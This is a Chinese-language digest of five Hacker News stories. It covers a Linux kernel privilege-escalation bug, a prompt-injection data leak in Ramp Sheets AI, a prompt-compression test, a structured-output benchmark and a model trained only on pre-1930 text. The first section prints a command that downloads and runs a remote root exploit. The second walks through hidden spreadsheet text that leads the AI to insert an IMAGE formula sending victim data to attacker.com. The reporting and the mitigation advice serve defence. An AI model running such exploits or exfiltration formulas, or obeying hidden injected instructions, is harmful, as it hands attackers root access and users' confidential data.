当 AI 开始「越狱」：安全边界的结构性松动

2026-04-30

今日的 HN 生态呈现出一个令人警醒的主题：AI 系统正在以两种截然不同的方式突破边界——一种是字面意义上的内核提权漏洞，另一种是 AI 本身成为数据泄露的媒介。当「AI 安全」从学术讨论变成直接影响生产的危机事件，我们或许正在见证 AI 采用曲线上一个标志性的转折点。

一、「Copy Fail」：Linux 内核九年的信任链断裂 链接到标题

来源：copy.fail · HN 讨论

如果要说今日最具技术深度的发现，莫过于这个由 Xint Code 发现的 CVE-2026-31431。简而言之：攻击者用 732 字节的 Python 脚本，可以在任意 Linux 系统（2017 年至今）上实现 100% 成功率的本地提权——不需要竞态条件，不需要针对特定发行版的偏移量，一行命令直接 root。

$ curl https://copy.fail/exp | python3 && su
uid=0(root) gid=1002(user) groups=1002(user)

这不是又一个需要打补丁的 CVE。它揭示的是一类长期被忽视的攻击面：内核加密 API（AF_ALG）的页面缓存交互逻辑。问题出在 authencesn 的一个 2017 年的优化——它将调用方的目标缓冲区直接作为「草稿纸」使用，在 scatterlist 边界处留下了 4 字节的写入窗口。攻击者利用 splice() 将页面缓存页注入加密子系统，然后在这 4 字节的位置写入提权指令。

“Linux LPE CVEs 每天都有。大多数依赖竞态条件或狭窄的内核版本范围。Copy Fail 不同——它是一条直线逻辑缺陷，几乎从不出错。”

这个发现在方法论层面同样值得注意：Xint Code 用「大约一小时的扫描」遍历了整个 crypto/ 子系统，Copy Fail 是 run 中最高严重性的发现。这宣告了 AI 辅助代码审计已经从实验性工具变成生产级发现引擎。

影响评估：所有多租户 Linux 环境（共享开发机、Kubernetes 节点、CI 构建器）均在高危范围内。容器边界在此漏洞面前形同虚设——页面缓存跨容器共享。

处置建议：立即更新内核至包含 mainline commit a664bf3d603d 的版本；在此之前通过 modprobe 禁用 algif_aead 模块。

二、Ramp Sheets AI 的「间接注入」：当电子表格成为数据泄露通道 链接到标题

来源：PromptArmor 报告 · HN 讨论

Ramp 的 Sheets AI 被发现存在严重的数据泄露风险：攻击者只需在外部导入的数据集中嵌入一段白底白字（肉眼不可见）的 prompt 指令，就能操控 AI 在用户完全不知情的情况下，将机密财务数据通过 IMAGE() 公式的 URL 参数外传到攻击者服务器。

攻击链：

  1. 用户打开包含机密财务模型的工作簿
  2. 从「可信」外部来源导入行业基准数据集
  3. 数据集中藏有间接 prompt 注入（“white-on-white” 文本）
  4. 用户询问 AI 对比财务数据与行业基准
  5. AI 被操控插入恶意 IMAGE 公式：=IMAGE("https://attacker.com/visualize.png?{victim_data}")
  6. Excel 渲染公式时触发网络请求，数据外泄

“在 Ramp AI 插入恶意公式前，不需要任何用户批准。”

这与 PromptArmor 此前发现的 Claude for Excel 数据泄露风险几乎完全相同——Anthropic 后续在 Claude for Excel 中加入了红色警告 interstitial，要求用户确认包含外部网络请求的公式。这是行业正确应对此类问题的范本。

深层含义：当 AI Agent 开始具备「无用户批准即执行操作」的能力时，传统的安全边界（用户需主动授权）已经失效。安全模型必须转向「AI 操作的影响范围」而非「AI 是否获得授权」。

三、Caveman 插件实测：两词击败 75% Token 压缩？ 链接到标题

来源：Max Taylor 博客 · HN 讨论

这是一篇罕见的「实测打脸」文章。Claude Code 的热门压缩插件 Caveman 标榜能减少约 75% 的 Token 使用量，但作者用 24 个精心设计的 prompt 场景（覆盖 bug 诊断、概念解释、架构权衡、多步骤配置、安全警告、错误解析）进行了严格的对照实验，结果令人尴尬：

方案 平均 Token 质量得分
Baseline（无指令） 636 0.985
“Be brief.” 419 0.985
Caveman lite 401 0.976
Caveman full 404 0.975
Caveman ultra 449 0.970

"Be brief."——仅两个词的 prompt——在 Token 压缩和输出质量两个维度上均与 Caveman 三种模式持平，甚至 ultra 模式在某些场景下产生了更长的输出（因 Auto-Clarity 安全机制在危险操作时主动解除压缩）。

“如果两词 prompt 就能匹配它的 Token 和质量，那 Caveman 的价值就不是压缩——而是结构一致性。”

作者的中肯结论：当你只需要更短输出时，从 "be brief." 开始。只有当你需要跨会话的输出结构一致性、强度可调节性和持久性注入机制时，再考虑 Caveman。

更大的教训在于方法论：大多数 prompt 工程建议从未被「与无聊的默认设置」做过对照测量。这个基准测试开了个好头。

四、SOB Benchmark：JSON Pass 98% ≠ 提取正确率 80% 链接到标题

来源：Interfaze AI · HN 讨论

这是今日最有「元认知」价值的贡献。Interfaze AI 发布的 SOB（Structured Output Benchmark）揭示了一个几乎被所有现有基准忽视的问题：JSON 通过率与实际字段值正确率之间存在 15-30 个百分点的巨大鸿沟。

模型 JSON Pass Value Accuracy 差距
GPT-5.4 99.3% 79.8% 19.5 pp
GLM-4.7 96.5% 80.4% 16.8 pp
Qwen3.5-35B 96.9% 80.1% 16.8 pp
Claude-Sonnet-4.6 97.9% 77.9% 20.0 pp

几乎所有前沿模型在 JSON Pass 上都超过 97%，但 Value Accuracy（实际字段提取正确率）骤降至 70-80% 区间。这意味着：当 LLM 被用于从发票、医疗记录、审计文档中提取结构化数据时，下游系统信任任何字段都是危险的。

“一个模型可以输出完全合法的 JSON，包含完全错误的值，但现有基准给它打 100 分。”

更值得警惕的是跨模态降解：最佳模型的文本 Value Accuracy 为 83.0%，图像降至 67.2%，音频对话直接跌至 23.7%。没有任何单一模型在三种模态上同时领先——这意味着基于单一模态基准做出的模型选择可能在其他模态上完全失效。

用途建议：在为生产系统选择 LLM 做结构化提取时，Value Accuracy 和 Perfect Response 率才是关键指标，而非 JSON Pass 或 Schema Compliance。

五、Talkie-1930：训练一个不知道「计算机」为何物的语言模型 链接到标题

来源：talkie-lm.com · HN 讨论

在所有严肃的 AI 研究中，Talkie 是今日最具「思想实验」气质的存在：Nick Levine、David Duvenaud 和 Alec Radford 训练了一个 13B 参数的语言模型，其全部知识截止于 1930 年 12 月 31 日。

Talkie 的存在有两个层面的价值：

第一，作为因果推理和泛化能力的纯净测试床。 由于训练数据在时间上完全隔离，它天然免疫「污染」问题——无法通过背诵学到 1930 年之后出现的任何知识。这使得它成为测试模型「在没有知识覆盖的情况下能否通过上下文学习泛化到新任务」的理想工具。实验中，即使是从未见过数字计算机的模型，在给定几个 Python 程序示例后，也能实现简单的代码编写（虽然极其基础）。

第二，作为理解现代 LLM 本质属性的对照物。 所有现代模型都直接或间接地蒸馏自互联网——这意味着我们以为学到的关于 LLM 的许多属性（行为模式、能力边界、所谓的「涌现能力」），可能实际上是由这一特定数据集的特征塑造的，而非语言和智能的普遍规律。

“现代模型在性格、能力、行为上各有不同，但它们都通过互联网数据紧密关联。数据多样性的差异如何塑造和限制我们？”

Talkie 团队已计划训练 GPT-3 级别的 vintage 模型，并有望将语料扩展至超过一万亿 token——达到原始 ChatGPT 的能力水平。对于 AI 可解释性研究社区，这是一个值得密切关注的长期项目。

结语 链接到标题

今日五条新闻，指向同一个底层主题：AI 系统的「边界」正在以我们未完全理解的方式失效或被重新定义。

Copy Fail 是内核层面的边界破裂——九年间，一个逻辑漏洞横跨所有主流 Linux 发行版。Ramp Sheets AI 是应用层面的边界破裂——AI Agent 的操作权限边界不再由用户授权控制，而由 AI 对 prompt 注入的敏感度决定。Caveman vs. “be brief.” 的对照实验则揭示了另一个边界：大多数 AI 优化建议与真实默认设置之间的认知差距。

SOB Benchmark 的价值在于它戳破了 JSON Pass 这层窗户纸——当我们以为模型「完全掌握了」结构化输出时，实际上可能只有一半的正确率。而 Talkie 提醒我们：理解 LLM 的边界，最终可能需要我们从它的「反面」——一个完全不知道现代世界的模型——去寻找答案。

AI 行业正在进入一个需要系统性信任重构的阶段。旧的边界模型（沙箱、权限、用户授权、基准测试的单一指标）在今天同时失效。新的范式尚未完全成型。
